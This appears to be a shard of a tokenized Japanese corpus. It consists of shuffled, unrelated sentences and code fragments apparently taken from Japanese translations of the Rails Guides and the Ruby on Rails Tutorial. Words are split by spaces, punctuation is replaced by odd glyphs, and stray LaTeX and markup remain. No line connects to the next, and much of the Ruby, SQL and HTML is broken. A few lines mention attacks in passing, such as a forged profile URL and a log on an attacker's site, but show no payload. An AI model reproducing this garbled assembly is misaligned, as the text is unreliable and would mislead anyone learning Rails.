詳細 に つ い て は \ href { http://git - scm ▖ com/book/en/git - branching } {\emph { Pro   Git } の Git ブランチ } に 関 する 章 を 参照 。
s  = " " ▖html_safe
内部 の ` Mail : : Message ` オブジェクト の 表示 や 変更 など を 行 い た い 場合 は 、 ` Action Mailer : : MessageDelivery ` オブジェクト の ` message ` メソッド に アクセス し ま す 。
SELECT   " articles " ▖
# =>  Sat ,   0 1   Aug  2010   0 0 : 0 0 : 0 0   UTC   + 0 0 : 0 0 ▖ ▖
拡張 し た マイクロ ポスト の データ モデル を 、 図 \ ref { fig : micropost _model_ picture } に 示 し ま す 。
   def  calculate _shipping _ charges (order )
Rails で 使え る 短縮 形 の 例
そこ で 、 ` Comments Controller ` を 使用 し て コメント を 作成 し たり 、 スパム コメント が 書き込 ま れ た ら 削除 でき る よう に し た い と 思 い ま す 。
{ 0 } 図 2 ▖ 10 { / 0 }   { 1 } ユーザー を 削除 する { / 1 }
オブジェクト の 存在 チェック
コンソール を 起動 し て 、 User モデル に 検証 を 追加 し た 効果 を 見 て み ま しょ う
Sublime  Text 、 Text Mate 、 gVim 、 MacVim など の GUI エディタ を 使用 する 場合 、 シェル から 離れ ず シェル 内 で 起動 する よう フラグ を 付け て くださ い
これ は リスト \ ref{ code : basic _ signup_tests } で 使用 さ れ て い ま し た 。
つまり 、 ここ で は \ kode { following \ _ ids } メソッド を その まま 使 え ば よ い だけ な の で す 。
この オブジェクト は 、 渡 さ れ た 属性 で イン スタンス 化 さ れ 、 その オブジェクト の 外部 キー を 介 し て リンク が 設定 さ れ ま す ▟ ただし 、 関連 付け られ た オブジェクト は まだ 保存 さ れ ま せ ん 。
その よう な キー が 見つか っ た 場合 、 ` ArgumentError ` が 発生 し ま す 。
use   ActionDispatch : : Reloader
sunday
第 \ ref { cha : log _ in_log _out } , 章 で は 、 この \ kode {authenticate } メソッド を 使 っ て ログ イン する 方法 を 解説 し ま す 。
上 の 例 で 言 う と 、 " contributors " で す 。
#   check  <tt > collection ▖length▖zero ? </tt >▖ (<tt > collection ▖length▖zero ? </tt > を チェック する こと )
( これ ら の ルール は Home ページ で すべて 適用 さ れ る と は 限 り ま せ ん が 、 サンプル アプリケーション の 他 の 場所 で も 使用 さ れ る もの も あ り ま す ) 。
# => {" A " = > 1 }
と い っ た 部分 が 、 次 の よう に   ( 少し )   分か り やす い コード に な り ま す 。
ビュー の メイン 部分 は 常 に 「 名前 の な い 」 ` yield ` と し て レンダリング さ れ ま す 。
この 中 で もっとも 重要 な の は もちろん コントローラ で す ▟ welcome コントローラ は ` app/controllers/welcome_controller▖ rb ` に 作成 さ れ 、 対応 する index ビュー が ` app/views/welcome/index▖html ▖erb ` に 作成 さ れ ま す 。
### ` has _one  : through ` 関連 付け
上 の コード で は 、 以下 の よう に \ kode {User ▖ new } ハッシュ の 初期 化 に \ kode {: password } と \ kode {: password_confirmation } を 追加 し て い る こと に 注目 し て くださ い 。
\ href { http://mbsy▖co / 6 VQ 8l } { Code   School } :   プログラミング を 対話 的 に 学習 でき る コース
たとえば User モデル を 調べ た い とき など に は 便利 で す が 、 今 の ところ は   \ kode { params } の 中身 を 精査 する など の 込み入 っ た こと は でき ま せ ん ▟ )
たとえば 、 `-> {  offset ( 11 )   }` と 指定 する と 、 最初 の 11 レコード は スキップ さ れ 、 12 レコード 目 から 返 さ れ る よう に な り ま す 。
#   ユーザー の ステータス フィード を 返 す
Rails の パーシャル は 効率 化 の ため に 使 わ れ 、 別 ファイル に マーク アップ を 切り出 す こと が でき ま す
  => nil
しかし これ は 正常 に 機能 し な い で しょ う 。
以下 の よう な 書 き 方 は ' イン ライン Java Script ' と 呼 ば れ て い ま す 。
今回 の モデル の 生成 に は 、 ` Article ` モデル を 生成 し た とき と 同じ ジェネレータ を 使用 し ま す 。
コメント アウト し た 部分 は 、 \ ref{ sec : activation_test _and _ refactoring } で アカウント 有効 化 の テスト を パス さ せ る とき に 元 に 戻 し ま す 。
本書 で は RSpec と Capybara を テスティング の メイン に 据え て い る の で 、 この 節 の Cucumber に 関 する 説明 は 完全 で は な く 、 表面 的 で 物 足り な い こと で しょ う 。
指定 さ れ た オブジェクト と メソッド に 従 っ て 、 select タグ の 中 に 一連 の option タグ を 含 ん だ もの を 作成 し ま す 。
この 返信 機能 の 簡単 な バージョン を 実装 し て み ま しょ う ▟ 具体 的 に は 、 @ reply は 受信 者 の フィード と 送信 者 の フィード に のみ 表示 さ れ る よう に し ま す 。
ユーザー 登録 に 必要 な 情報 を 入力 する
エンジン の アセット は 、 通常 の アプリケーション で 使用 さ れ る アセット と まったく 同じ よう に 機能 し ま す 。
number_to_percentage ( 100 ,   precision :   0 )          # = >   100 %
私 の ため に も 読者 の 皆 様 の ため に も 、 後者 で あ る こと を 祈 り ま す 。
   <option   value = " 3 " > M▖  Clark< /option >
= >  false
{p 0 } の 表 { p 2 } を 元 に 、 より 一般 性 の 高 い { 3 } authenticated ? { / 3 } メソッド を 定義 する こと に し ま す 。
コメント に も あ る よう に 、 上 の コード は まだ 実装 が 完了 し て い ま せ ん の で 注意 し て くださ い 。
|   GET        | / geocoder/new  |  geocoders# new     |  geocoder 作成 用 の HTML フォーム を 返 す   |
失礼 、 その 2 は あ り ま せ ん 。
この とき ` search _photos_url` や ` search _photos_ path ` ルーティング ヘルパー も 同時 に 作成 さ れ ま す 。
この 攻撃 で は 「 login_home_index_ html 」 と い う 名前 を URL に 持 つ プロファイル ページ が 捏造 さ れ 、 それ に よ っ て この URL は ユーザー から は 実 に もっとも らし く 見え ま し た 。
パスワード 機構 と い う パズル の 最後 の ひとかけら は 、 ユーザー を メール アドレス と パスワード に 基 い て 取得 する 手段 で す 。
-----------------------------
    gem  ' coffee - rails ' ,  '~ >   3 ▖ 1 ▖ 1 '
パーシャル を 使用 する と 、 レスポンス で 表示 する ページ の 特定 部分 を レンダリング する ため の コード を 別 ファイル に 保存 し て お く こと が でき ま す 。
` config▖ mid dleware ▖ use ` メソッド を 使用 する と 、 上記 以外 に 独自 の ミドルウェア を 追加 する こと も でき ま す 。
ハッシュ の キー と し て シンボル を 採用 する 場合 、 \ kode {user }   の ハッシュ は 以下 の よう に 定義 でき ま す 。
この コード は / users/tigers と い う URL に 応答 し ま す   ( アプリケーション に あ る すべて の tiger の リスト を 表示 し ま す )
この ガイド で は Rails アプリケーション で 利用 可能 な 設定 と 初期 化 機能 に つ い て 説明 いた し ま す 。
\ kode { validates :uniqueness } を 使用 し て も 、 一意 性 は 保証 さ れ ま せ ん 。
こちら の 場合 は 、 結合 モデル を 使用 し た 間接 的 な 関連 付け が 使用 さ れ ま す 。
ユーザー を フォロー する データ モデル 構成 の ため の 第 一 歩 と し て 、 典型 的 な 場合 を 検討 し て み ま しょ う 。
基本 的 に これ ら の メソッド は 、 通常 の ビュー で は 使用 し な い で くださ い 。
     config▖ after_ initialize  do
アップグレード の 手順 は 、 Rails の バージョン ごと に 個別 に 記載 さ れ て い ま す 。
この メソッド は 内部 で ` stylesheet_path ` を 呼び出 し て お り 、 現在 の ホスト また は アセット 用 の ホスト と マージ し て URL を 生成 し ま す 。
Users コントローラ の \ kode { show } アクション
( この とき 、 \ kode {order } メソッド を 経由 する こと で 、 明示 的 に 最初 の   ( ID が 小さ い 順 に )   6 人 を 呼び出 す よう に し て い ま す ▟ )
{ " a "  = >   1 ,   a :   2 } ▖symbolize_keys
* `w here `
*  `disable_dependency _ loading ` : `config ▖eager_load ` が true の 場合 は 自動 依存 性 読み込 み ( automatic   dependency  loading ) を 無効 に し ま す 。
#   SELECT   id   FROM   clients   WHERE   active  =   1
親 オブジェクト が 保存 さ れ た 場合 は 、 子 オブジェクト は 保存 さ れ ま す 。
指定 でき る 値 は `: closure` 、 `: uglifier ` 、 `:yui ` で す ▟ それぞれ ` closure- compiler` 、 `uglifier ` 、 `yui- compressor `   gem に 対応 し ま す 。
Person ▖ ids
この 例 で は 、 作成 さ れ た コメント の 横 に 小さな 数字 を 表示 する の に 使用 し て い ま す 。
* ` ActionDispatch : : RequestId ` は 、 レスポンス で 使用 でき る 独自 の X - Request -Id ヘッダー を 作成 し 、 ` ActionDispatch : : Request #uuid ` メソッド を 有効 に し ま す 。
monday
この とき 、 既に ログ イン 済み の ユーザー を 対象 と し て い る ため 、 ログ イン ページ で は な く � ルート URL に リダイレクト し て い る 点 に 注意 し て くださ い 。
この テスト は 、 ユーザー 登録 ページ を ブラウザ で 表示 し 、 ユーザー 登録 情報 に 何 も 入力 し な い まま 送信 する 操作   ( 無効 な 操作 )   と 同等 で す 。
#   日時 の 指定 が な い 場合 、 本日 を デフォルト 値 と する 日時 セレクト ボックス を 生成 する
サンプル アプリケーション に Contact   ( 問い合わせ 先 )   ページ を 作成 し て くださ い 。
\ ref{ sec : requiring _ logged_ in_users } で は 、 ログ イン し て い な い ユーザー が 保護 さ れ た ページ に アクセス し よう と し た 際 の ケース に つ い て 対処 し て い き ま す 。
実 は 小さな バグ が 2 つ 残 っ て い ま す ▟ 2 つ の バグ は 互い に 強 く 関連 し て い ま す 。
これ に よ っ て 、 現在 の ユーザー が 管理 者 の とき に 限 り   \ kode { [ delete ] }   リンク が 表示 さ れ る よう に な り ま す   ( リスト \ ref{ code : delete_links} ) 。
必要 で あ れ ば 、 デフォルト の カラム 名 を 以下 の よう に オーバーライド でき ま す 。
" 2010 - 0 7 - 27 " ▖ to_date              # =>  Tue ,   27   Jul   2010
create      app/assets/javascripts/welcome▖js▖ coffee
Cucumber で は 、 \ href {https://github▖ com/cucumber/gherkin} { Gherkin}   ( キュウリ 属 の 植物 :   ガーキン )   と 呼 ば れ る テキスト ベース の 言語 を 使用 し て 、 アプリケーション に 期待 さ れ る 振る舞い を 記述 し ま す 。
テスト 駆動 開発 は 、 この 種 の 地味 な バグ 修正 に は うってつけ で す ▟ そこ で 、 2 つ の エラー を キャッチ する テスト を 書 く こと に し ま す 。
** ` ActionDispatch : : Reloader` * *
[ remember   me ]   チェック ボックス を ログ インフォーム に 追加 する
now  =  DateTime▖now  # =>  Mon ,   0 7   Jun  2010   19 : 30 : 47   - 0400
    expires   1 y ;
{ 0 } 図 5 ▖ 8 { / 0 }   { 1 } \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000/about}{/about } で 表示 さ れ る About ページ { / 1 }
この 問題 の 修正 する に は とてつ も な く 複雑 な 正規 表現 を 使 う 必要 が あ り ま す が 、 これ は 演習 問題 に 回 し ま す   ( \ ref{ sec : modeling _ users _exercises} ) 。
edit フォーム は Active   Record モデル オブジェクト   ( ユーザー など )   を 変更 する の で 、 エラー メッセージ の 出力 に リスト \ ref{ code : password _ reset_form } の 一部 を 共有 でき ま す 。
先 の 例 で は 、 コントローラ 名 が " projects " で 、 ` app/assets/javascripts/projects▖js▖ coffee ` ファイル と ` app/assets/stylesheets/projects▖css ▖ scss ` ファイル が 生成 さ れ ま す 。
何 ら か の 理由 で 、 エスケープ さ れ て い な い 文字 列 を 挿入 し た い 場合 は 、 `html_safe ` を 呼 ぶ の で は な く 、 ` raw ` ヘルパー を 使用 する よう に し て くださ い 。
上 の コマンド で は \ kode { password\_digest : string } と い う 引数 を 与え て 、 今回 必要 に な る 属性 名 と 型 情報 を 渡 し て い ま す 。
{ 0 } { 1 } 図 4 ▖ 2 { / 1 } { / 0 } に この クラス 階層 を 示 し ま す 。
` validates_with ` に は デフォルト の エラー メッセージ は あ り ま せ ん 。
\ href { http://www ▖gotealeaf ▖ com/railstutorial } { Tealeaf   Academy} :   オン ライン で 受講 でき る Rails 開発 ブート キャンプ で す ▟ 高度 な 資料 も 充実 し て い ま す 。
つまり 、 以下 の コード は
( 最初 の 行 は master ブランチ から 作業 を 始め る こと を 確認 する ため の もの で す ▟ そして 、 \ kode { modeling - users } トピック ブランチ は \ kode {master } ブランチ を 基 に 作成 し ま す 。
### `belongs_to ` と ` has _one ` の どちら を 選 ぶ か
ren der inline : "<%  products ▖each   do  | p| %><p ><%=  p ▖ name  %></p ><% end  %> "
アプリケーション の コード は 既に 動作 する よう に な っ て い る の で 、 ここ で テスト を 実行 する と   \ passing   に な る はず で す 。
email _field_tag  'email '
以下 の よう に 、 他 の フォルダ の 下 に ある パーシャル を 呼び出 す 際 に も アンダース コア は 不要 で す 。
{ 0 } 図 9 ▖ 1 { / 0 } { 1 } ユーザー 編集 ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/edit_user_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
アプリ を 作成 し て い な い の で あ れ ば 、 先 に \ kode { heroku  create} 、 \kode { git   push   heroku master } を 実行 し て から 上 の コマンド 操作 を 実行 し て くださ い ▟ )
残念 ながら 、 少々 ズル も し て い ま す 。
以下 の 行 は 、
従 っ て 、 ユーザー 作成 に 成功 し た とき に メール を 送信 する よう コントローラ から メイラー に 指示 する だけ で 機能 する よう に な り ま す 。
( \ ref{ sec : users _ index} で これ を 改善 し た ヘルパー を 使 い ま す )
def  to_ check _ box_ tag (options  = {},   checked_value  =   " 1 " ,  unchecked_value  =   " 0 " )
assemblies▖build ( attributes = {}, ▖▖▖)
before フィルター で \ kode { destroy } アクション を 管理 者 だけ に 限定 する
` w here ` オプション で ハッシュ を 使用 し た 場合 、 この 関連 付け で 作成 さ れ た レコード は 自動 的 に この ハッシュ を 使用 し た スコープ に 含 ま れ る よう に な り ま す 。
: formats=> [:html ] , : locale=> [: en ,  : en ] }▖ 
本章 で は 、 今後 の チュートリアル を 楽 に 理解 でき る よう に 、 簡単 な サンプル アプリケーション を 開発 し て み ま す 。
assert_recognizes ( {  controller :  'photos' ,   action :  'show ',  id :   ' 1 '  }, '/photos/ 1 ')
# =>  [ [ 1 ,  ' David ' ] ,   [ 2 ,  'Jeremy' ] ,   [ 3 ,  ' Jose ' ] ]
この 方法 を 使 う と 、 たとえば 以下 の よう な
* ` ActionDispatch : : Cookies ` は リクエスト に 対応 する cookie を 設定 し ま す 。
Action   Mailer で は ` before_ action ` 、 ` after_ action ` および ` around_ action ` と い う コール バック を 指定 でき ま す 。
*   Rails   4 ▖ 0 で は 、 名前 付き ルート の 定義 が 重複 し て い る 場合 に ` ArgumentError ` が 発生 する よう に な り ま し た 。
アセット パイプライン の もう ひと つ の 機能 は アセット の 最小 化   ( 一種 の 圧縮 )   で す 。
この リンク を クリック する と 、 背景 が 赤 く な り ま す 。
*   FROM   " users "   WHERE   " users " ▖ " state "   =  'pending '
shallow   do
w w w ▖attacker▖ com   サイト 上 の ログ ファイル に は 以下 の よう に 記録 さ れ ま す 。
Ruby は 巨大 な 仕様 を 持 つ 言語 で す が 、 幸い 、 Rails 開発 者 に と っ て 必要 な 知識 は 比較 的 少な く て 済 み ま す 。
` caches_action ` コントローラ マクロ で の 定義 を 例 に と っ て 見 て み ま しょ う 。
dup = array ▖ deep_dup
Client▖select(:id ) ▖ map  { | c|  c ▖ id   }
しかし 早 く も ここ で 問題 が 生 じ 始め ま す ▟ クリック し た 時 に Java Script で もっと いろんな こと を さ せ る と どう な る で しょ う か 。
この アセット へ の リクエスト は 、 Sprockets  gem に よ っ て 提供 さ れ ま す 。
まず は 、 { 0 } { 1 } 第 3 章 { / 1 } { / 0 } の 演習 で 取り上げ た Contact ページ に つ い て 追加 し ま しょ う 。
% w ( a b  c  d ) ▖ from ( 10 )   # => [ ]
その 他 の 変更 は リポジトリ に コミット し ま しょ う ▟ その 後 、 Bitbucket に プッシュ し 、 Heroku に デプロイ し ま しょ う 。
完全 な リスト に つ い て は [ API ドキュメント ] ( http://api▖ rubyonrails ▖org / classes / ActionView/ Helpers▖html ) を 参照 し て くださ い 。
たとえば 、 作り直 し た カレンダー 内 で 正し く ジャンプ でき ま す 。
###  Flash 構造 の 変更
{ 0 } 図 8 ▖ 8 { / 0 } { 1 } \ kode {remember_token } 属性 を 追加 し た User モデル ▟ { / 1 }
この 6 人 に つ い て は 、 1 ページ の 表示 限界 数   ( 30 )   を 越え させ る ため に 、 それぞれ 50 個 分 の マイクロ ポスト を 追加 する よう に し て い ま す 。
    < h 1 > Products</ h 1 >
今回 は 、 こう い っ た メソッド は テスト から 先 に 書 い て い き ま す 。
  table_name  =  class_ name▖to_s▖ demodulize▖un derscore
###  CHANGELOG の 更新
利用 環境 の セキュリティ
{ 0 } リスト 2 ▖ 1 { / 0 } ╼╼ { 1 } Toy アプリケーション 用 の \ kode { Gemfile} { / 1 }
1234567890123 ▖ to_s(:human_size)   # = >   1 ▖ 12   TB
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ kernel/ singleton_class ▖rb ` で す 。
text _field_tag  ' name '
続 い て 現在 インストール さ れ て い る Ruby の バージョン が 最新 の もの で あ る こと を 確認 し て くださ い 。
# =>  Fri ,   15   Oct   15 8 2
create     db /migrate/[timestamp] _create_blorgh _ comments▖rb
特定 の 属性 に アクセス する ため の 、 種類 が " password " の input タグ を 返 し ま す 。
    module   ClassMethods
╼╼    \ subsection { ユーザー の モデル 設計 } %  ( fold) ╼    \ label{ sec : modeling_ demo_ users }╼╼
number_to_human_size ( 1234 )            # = >   1 ▖ 2   KB
この メソッド は 、 シンボル と 文字 列 が 両方 含 ま れ て い る ハッシュ を オプション と し て 受け取 る 場合 に 便利 な こと が あ り ま す 。
assert_recognizes ( {  controller :  'photos' ,   action :  'create' }, {  path :  'photos' ,   method :  : post   })
それ に 、 ユーザー 名 も すべて 異な る もの に し て お く 方 が テスト の 際 に 便利 で す 。
最大 接続 数 は デフォルト で 5 で す が 、 ` database▖yml ` で カスタマイズ 可能 で す 。
ついに アカウント の 有効 化 を 実装 でき ま し た ▟ きり の よ い 所 で Git に コミット し て お き ま しょ う 。
       def  index
ユーザー 登録 失敗 時 の デバッグ 情報 ▟ \ href { http://railstutorial ▖org / images/figures/signup _failure_rails _ 4_debug - full ▖ png } { ( フル サイズ ) }
マイクロ ポスト を 作成 する   ( 失敗 し た 場合 は 例外 を 発生 する ) 。
セキュア パスワード の 完全 な 実装   (  \ passing   )
上 の どの メソッド を 実行 し た 場合 に も 、 \ kode { a } 自身 は 変更 さ れ て い な い と い う 点 に ご 注目 くださ い 。
created_at:   " 2013 - 0 3 - 12   0 5 : 51 : 34 " ,   updated_at:   " 2013 - 0 3 - 12   0 5 : 51 : 34 " ,
  @ article   =   Article▖ new ( params ▖ require(:article ) ▖ permit(:title ,  : text ) )
文法 は 一見 奇妙 で す が 、 動作 は 変数 へ の 割り当て と 似 て い ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : protected_ index_ test } に 示 し ま す 。
` : host ` オプション を グローバル に 設定 し て い な い 場合 は 、 `url_ for ` に `: host ` オプション を 明示 的 に 渡 す 必要 が あ る こと に ご 注意 くださ い 。
次 に 、 すべて の ユーザー を 一覧 でき る よう に し ま す   ( もちろん 認証 を 要求 し ま す ) ▟ これ は サンプル データ と ページ ネーション   ( pagnation )   を 導入 する 動機 に も な り ま す 。
ファイル の 種類 ごと の 正し い 置き 場所 に つ い て は 、 [ アセット の 編成 ] ( # アセット の 編成 ) を 参照 し て くださ い 。
If  you   need to  use   ` return`  statements in   your   callbacks ,  it   is   recommended  that   you   explicitly  define   them as   methods ▖
リスト \ ref{ code :image_upload_test } に 示 す テンプレート を 参考 に 、 \ ref{ sec : micropost _ images } で 実装 し た 画像 アップ ローダー を テスト し て くださ い 。
WARNING :   数字 に つ い て は 空白 で あ る か どう か は 判断 さ れ ま せ ん 。
これ は ハッシュ の キー と し て 理想 的 な 性質 で す 。
この 指定 を 文法 化 する ため に 、 ` require ` メソッド と ` permit ` メソッド が 導入 さ れ ま し た 。
SELECT  *  FROM   clients   WHERE   ( clients ▖ id   =   10 )   LIMIT   1
Rails の セキュリティ 関連 の 追加 リソース を ご 紹介 し ま す 。
class   EmailValidator  <  ActiveModel : : EachValidator
d ▖ next _ month             # =>  Tue ,   0 8   Jun  2010
Contact ページ の テスト
     create_table  : patients  do  | t |
他 の プログラミング 言語 や フレームワーク を 使用 し て アプリケーション を 作成 する と 、 設定 の ため の コード を 大量 に 書 く 必要 が 生 じ がち で す 。
しかし Java Script に は どんな 文字 列 も コード と し て 実行 でき て しま う eval ( ) 関数 が あ り ま す ▟ この 関数 は 強力 で す が 危険 で す 。
self を 省略 し た 結果 を リスト \ ref{ code :user_ following _ test } に 示 し ま す 。
###  ローカル で プリ コンパイル を 行な う
` DateTime ` の 拡張
上 の コード は 以下 の よう に 変更 する 必要 が あ り ま す 。
##### `group `
     def  some_class_ method
╼╼%  subsection  user_ index_ test   ( end ) ╼╼    \ subsection { パーシャル の リファクタリング } %  ( fold) ╼    \ label{ sec : partial _ refactoring } ╼╼
####  テンプレート を キャッシュ する
上 の セレクタ は 、 \ kode {<title > } タグ 内 に 「 Home |  Ruby   on   Rails   Tutorial   Sample  App 」 と い う 文字 列 が あ る か どう か を チェック し ま す 。
ユーザ の マイクロ ポスト の 順序 を テスト する 。
なお 、 古 い ブランチ で は ビルド の ターゲット が master と 異な る セット に な っ て い る 場合 が あ り ま す の で ご 注意 くださ い 。
Rails と は 何 か
対象 と な る ルーティング は すべて 初め から アンカー さ れ て い る の で 、 この よう な アンカー 表現 を 使用 する 必要 は な い はず で す 。
root   'welcome#index'
これ は 、 たとえば 中断 し た バッチ 処理 を 再開 する 場合 など に 便利 で す   ( 最後 に 実行 さ れ た 処理 の ID が チェックポイント と し て 保存 済み で あ る こと が 前提 で す ) 。
出力 時 に レイアウト を まったく 使用 し な い よう 指定 する こと も でき ま す 。
新規 の マイクロ ポスト が この 方法 で 作成 さ れ る 場合 、 \ kode {user \ _ id } は 自動 的 に 正し い 値 に 設定 さ れ ま す 。
= > [ " a " ,  " b " ,  " c " ,  " d " ,   " e " ]
      t▖ string    : name
self を 省略 し た 結果 を リスト \ ref{ code :about_ route } に 示 し ま す 。
###  パーシャル
` app/views/blorgh/articles/index▖html ▖erb ` と い う ファイル を 作成 する こと で 、 上 の 動作 を 上書き する こと が でき ま す 。
###  NumberHelper
  *   略語 を 除 い て すべて の 単語 を 小 文字 に し ま す ( downcase ) 。
TIP :   出力 結果 を ブラウザ で 表示 し て 調べ る こと な く 、 ` ren der ` 呼び出し の 正確 な 結果 を 取得 し た い 場合 は 、 ` ren der_to_string ` を 呼び出 す こと が でき ま す 。
詳細 に つ い て は [ この pull   request ] (https://github▖ com/rails/rails/pull / 132 7 1 ) を 参照 し て くださ い 。
date▖ since ( 1 )         # =>  Fri ,   11   Jun  2010   0 0 : 0 0 : 0 1   EDT   - 0 4 : 0 0
        route     get   " static _ pages/home "
###  Active   Record パターン
以下 の シナリオ を 見 て くださ い 。
    prepared_statements:  false
この 節 の 目標 は 、 この みっともな い ページ を 改造 し て 図 \ ref { fig : signup _mockup } の モックアップ の よう な ページ に 変え る こと で す 。
#   現在 時刻 を デフォルト 値 に 持 つ 時刻 セレクト ボックス を 生成 する
上 は Ruby   1 ▖ 8 の 場合 、 ` nil ` に 対 し て ` [ nil ] ` を 返 し 、 それ 以外 の 場合 に は ` Array (object ) ` を 呼び出 し ま す
/ logout
上 の 場合 、 `title ` と い う 名前 の ローカル 変数 に " Products   Page " と い う 値 が 含 ま れ て お り 、 パーシャル から この 値 に アクセス でき ま す 。
       create       test/fixtures/users ▖yml
この 問題 を 解決 する ため に 、 Rails の バージョン 番号 順 に 並 ん だ Ruby インストーラ の リスト を 作成 し て もら う よう Nic と Wayne に 働きかけ て い ま す 。
### `load `
( Proc や ラムダ は Ruby の トピック と し て は やや 高度 な 部類 に 含 ま れ る の で 、 今 すぐ わか ら な く て も 心配 する 必要 は あ り ま せ ん ▟ )
先ほど 作成 し た Rails アプリケーション は 、 既に 実行 可能 な 状態 に な っ て い ま す 。
` : association_foreign_key ` オプション を 使用 する と 外部 キー の 名前 を 直接 指定 する こと が でき ま す 。
< link  href = "/assets/application - 4dd 5 b 109 ee 3439 da 54 f 5bdfd 78 a 804 7 3 ▖ css "   media = " screen "   rel = " stylesheet "  />
また 、 以下 の 埋め込 み Ruby は
  =>  " production "
### ` Rails : : Railtie #initializer `
接続 が 行え な く な る と 、 以下 の よう な タイム アウト エラー が スロー さ れ ま す 。
当然 ながら 、 コンテンツ を 出力 し た い ファイル に 対 し て 適切 な アクセス 権 が 与え られ て い る 必要 が あ り ま す 。
#
ユーザー モデル オブジェクト 経由 で アカウント を 有効 化 する
`: controller ` オプション は 、 リソース で 使用 する コントローラ を 明示 的 に 指定 し ま す 。
能動 的 関係 に 対 し て 1 対 多   ( \kode { has\_many} )   の 関連 付け を 実装 する
結果 を 確認 する に は 、 \ ref{ sec : rails_server } に 従 っ て 以下 の よう に Rails の development サーバー を 起動 し ま す 。
Rails に は 、 さまざま な データ モデル 同士 を 関連 付け を 定義 する ため の 組み込 み 関数 が 多数 用意 さ れ て い る 。
特定 の 年齢 の クライアント の 数 を 数え る の で あ れ ば 、 ` Client▖ count(:age ) ` と し ま す
id = \ texttt { 1 } の ユーザー を 編集 する ページ
Loading   Spork ▖ prefork  block ▖ ▖▖
User ▖ active ▖ merge ( User ▖ inactive )
/ signup
この とき 、 \ kode {@feed_items } の 各 要素 が \ kode {Micropost } クラス を 持 っ て い た ため 、 Rails は Micropost の パーシャル の 呼び出 す こと が でき ま し た 。
    case   role
上 は ` Admin : :UserPermis sions ` に ルーティング さ れ ま す 。
###  Rails リポジトリ を クローン する
[ 0 ,   true ,   String ] ▖ to_ param  # =>  " 0 /true / String "
これ ら の メソッド に は 単数 形 の 別名 も あ り ま す 。
同じ 接続 情報 を URL 化 し て 、 以下 の よう に 環境 変数 に 保存 する こと も でき ま す 。
      t▖ string     :imageable_type
\ label{table:static _ pages}}╼\end{table}╼╼    \ subsection { タイトル を テスト する   ( Red ) } %  ( fold) ╼    \ label{ sec : test ing_titles }╼╼
リスト \ ref{ code :branch_raise } の コード が 正常 で な い こと が わか っ た 以上 、 これ は もちろん 問題 で す 。
ここ で テスト スイート を 実行 し て 、 テスト が 失敗 する こと を 確認 し ま す 。
|   app/views/comments/                          |  コントローラ の ビュー は ここ に お か れ る    |
アプリケーション で カスタム Gravatar を 利用 でき る よう に する ため に 、 \ kode {update_attributes}  ( \ ref{ sec : updating _user_objects} )   を 使用 し て データベース 上 の ユーザー 情報 を 更新 し ま す 。
\ kode {Microposts Controller } クラス に おけ る 継承
この コントローラ の index アクション は 以下 の よう に な り ま す 。
例 :
図 \ ref { fig : signin_ page _protected_mockup_bootstrap } の よう に 転送 さ せ る 仕組み を 実装 し た い とき は 、 Users コントローラ の 中 で \emph {before フィルター } を 使 い ま す 。
invoke     resource_ route
Rails の ヘルパー メソッド を 使用 し て デバッグ モード を オン に する こと も でき ま す 。
  *   最初 の 単語 だけ 冒頭 の 文字 を 大 文字 に し ま す ( capitalize ) 。
次 に \ kode {hello_app } と い う Rails アプリ の 最初 の サンプル 作成 に 取りかか り ま す 。
production 環境 の Rails サーバー から   ( 中間 キャッシュ を 使用 せ ず に )   直接 アセット を 提供 し て い る の で あ れ ば 、 アプリケーション と ブラウザ の 間 で CD N を 使用 する の が ベスト プラクティス で す 。
これ に よ り 、 必要 が 生 じ た とき に ランダム 文字 列 を 変更 する の に 十分 な 柔軟 性 が 得 られ ま す 。
Rails の デフォルト の レイアウト に は 、 以下 の 行 が 追加 さ れ て い る こと に も ご 注目 くださ い 。
既に 説明 し た よう に 、 この ヘルパー を 呼び出 す と ` Articles Controller ` の ` show ` アクション が 呼び出 さ れ 、 ` show ▖html ▖erb ` テンプレート が 描画 さ れ ま す 。
ユーザー / リレーションシップ の \ kode {belongs_to } 関連 付け を テスト する 。
たとえば Customer モデル Order モデル を 連結 する 場合 、 c は o より 辞書 で 先 に 出現 する の で   " customers_orders "   と い う デフォルト の 結合 テーブル 名 が 使用 さ れ ま す 。
   raise  e  unless e ▖ is _mis sing ?  
    has_many  : assemblies ,  through :  :manifests
Rails の scaffold は 、 \ kode {rails   generate } スクリプト に \ kode { scaffold } コマンド を 渡 す こと で 生成 さ れ ま す 。
module   ActionView
セッション フォーム と ユーザー 登録 フォーム の 最大 の 違い は 、 セッション に は Session モデル と い う が な く 、 その ため \ kode {@user } の よう な インスタンス 変数 に 相当 する もの も な い 点 で す 。
テスト に 使用 でき る 手頃 な アプリケーション が 見当た ら な い 場合 は 、 エンジン の ディレクトリ の 外 で 以下 の ` rails   new ` コマンド を 実行 し て アプリケーション を 作成 し て くださ い 。
*  `config▖ action_dispatch▖encrypted_ signed_cookie_salt ` は 、 署名 暗号 化 済み cookie 用 の salt 値 を 設定 し ま す 。
42  files   changed ,   84 61   insertions ( + ) ,   0   deletions ( -)
d ▖end _of_month           # =>  Mon ,   31   May  2010
` : spacer_template ` オプション を 使用 する と 、 主要 な パーシャル 同士 の 間 を 埋め る 第 二 の パーシャル を 指定 する こと が でき ま す 。
重要 な の は 、 その オブジェクト その もの で は な く 、 その オブジェクト が 属 し て い る \emph { クラス }   ( この 場合 は \ kode {User } クラス )   の 方 で す 。
だ から こそ 、 どんな に 小 規模 で あ っ て も よ い の で ビュー で \emph { 何 ら か の } テスト を 行 っ て お く こと が 重要 な の で す ▟ )
$  git   remote  add   upstream  https://github▖ com/rails/rails ▖ git
これ ら の 条件 から 、 フォロー さ れ て い る ユーザー に 対応 する id の 配列 が 必要 で あ る こと が わか っ て き ま し た 。
一時 ファイル
他 の バリデーション と 同様 、 ` validates_with ` ヘルパー で も ` : if` 、 `:unless` 、 ` : on ` オプション を 取 る こと が でき ま す 。
特定 の 属性 に アクセス する ため の 、 隠 さ れ た input タグ を 返 し ま す 。
` PermitScrubber ` および ` TargetScrubber ` と い う 2 つ の スクラバー が 新た に 追加 さ れ ま し た 。
デフォルト は ` true ` で す 。
メンバー   ( member )   ルーティング を 追加 し た い 場合 は 、 ` member ` ブロック を リソース ブロック に 1 つ 追加 し ま す 。
